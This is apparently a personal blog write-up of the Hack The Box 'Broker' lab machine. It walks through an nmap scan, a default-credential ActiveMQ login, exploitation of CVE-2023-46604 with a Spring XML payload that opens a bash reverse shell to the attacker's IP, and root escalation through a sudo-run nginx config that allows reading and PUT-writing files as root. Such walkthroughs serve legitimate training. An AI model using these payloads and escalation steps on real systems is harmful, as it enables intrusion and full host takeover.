---
title: Hack The Box | Broker Writeup  
date: 2024-02-02 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [Broker, HTB, Writeup] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/broker.png
  lqip: data:image/png;base64,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
---

The Machine IP address (victim): 10.129.27.9

## Enumeration:

### Port Scan

Lets take the first step with nmap scan `nmap -sV -A -T5 10.129.27.9 -oA 10.129.27.9`

``` bash
# Nmap 7.94SVN scan initiated Fri Feb  2 21:06:29 2024 as: nmap -sV -A -T5 -oA 10.129.27.9 10.129.27.9
Warning: 10.129.27.9 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.27.9
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE    SERVICE   VERSION
22/tcp  open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open     http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
280/tcp filtered http-mgmt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  2 21:06:57 2024 -- 1 IP address (1 host up) scanned in 28.21 seconds
```

Nmap scan gave out port 22 SSH, 80 Nginx and 280 filtered. I am settling with this for now and will initiate a separate scan if needed 😊.

I went ahead and opened the page which prompted me for password. My first try was to just put in admin as username as well as password.

![img-description](/assets/img/htb/broker/1.png) _Login prompt_


Which worked and presented me with ActiveMQ admin page. While looking further it gave the version as `5.15.15`.

![img-description](/assets/img/htb/broker/2.png) _Version Disclosure_

## Foothold:

I went ahead and searched for any relevant vulnerability, and it came out there is a vulnerability for `5.15.15` version of ActiveMQ [CVE-2023-46604](https://www.prio-n.com/blog/cve-2023-46604-attacking-defending-ActiveMQ).

## Privilege Escalation:

### To User Access:

I cloned the github repo and modified the poc.xml file with a payload for reverse shell and started netcat listener on port 4444.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1</value>
                <!-- <value>bash</value>
                <value>-c</value>
                <value>touch /tmp/success</value> -->
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

In a different terminal i initiated a python webserver (python -m http.server) to serve the shell.xml, the payload for our exploit.

```bash
python -m http.server
```

Now I executed the ActiveMQ exploit.

![img-description](/assets/img/htb/broker/3.png) _running the exploit_

![img-description](/assets/img/htb/broker/4.png) _reverse shell_

I was able obtain reverse shell and now we own the user of machine.

### From User to Root:

I ensured to stabilize the shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

stty raw -echo; fg

#Press Enter twice, and type the command 
export TERM=xterm 
```

> While you enter `ctrl-z` you will see a session suspended message. no worries it just backgrounds the terminal, and you will regain the session once you enter `fg` and the view will be fixed with `export TERM=xterm`
{: .prompt-info }

Now as we have a stable shell first thing I did was to execute `sudo -l` command.

```bash
activemq@broker:~$ sudo  -l 
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:~$ 
```

It shows we have the abliity to run nginx with sudo privileges without password.

I spend some time with [nginx documentaion](https://docs.nginx.com/nginx/admin-guide/web-server/web-server/) and could  figure out that we may can create config file for nginx and make nginx to read or put files in root directory.

Another reference: [Nginx Full Example configuration](https://www.nginx.com/resources/wiki/start/topics/examples/full/.
)
Let's give it a try right! I created a config file `shell.conf` that would allow us to read as well as put file to root users directory.

```bash
user root;
events {
	worker_connections 1024;
}
http {
	server{
		listen 1337;
		root /;
		dav_methods PUT;
	}
}
```

Next step was to make nginx use our custom conf file by running the command.

``` bash
activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/shell.conf 
```

##### Method 1:

By using `curl` I tried to read the root.txt file from root user home directory.

```bash 
activemq@broker:~$ curl localhost:1337/root/root.txt
```

It worked and we had our root flag. 

##### Method 2:

Now, our crafted conf file enables the option to PUT any file in to root users home directory. We can leverage that to generate ssh keys and have it put under /root/.ssh/authorized_keys.

Created RSA SSH key pair from my host machine and pasted the public key using curl command.
![img-description](/assets/img/htb/broker/5.png) _ssh-keygen_

![img-description](/assets/img/htb/broker/6.png) _curl to PUT authorized_key_

Once I pasted the RSA public key, I used the private key to login to the machine as root user.  

![img-description](/assets/img/htb/broker/7.png) _SSH login as root_

We have the machine `ROOTED!`  
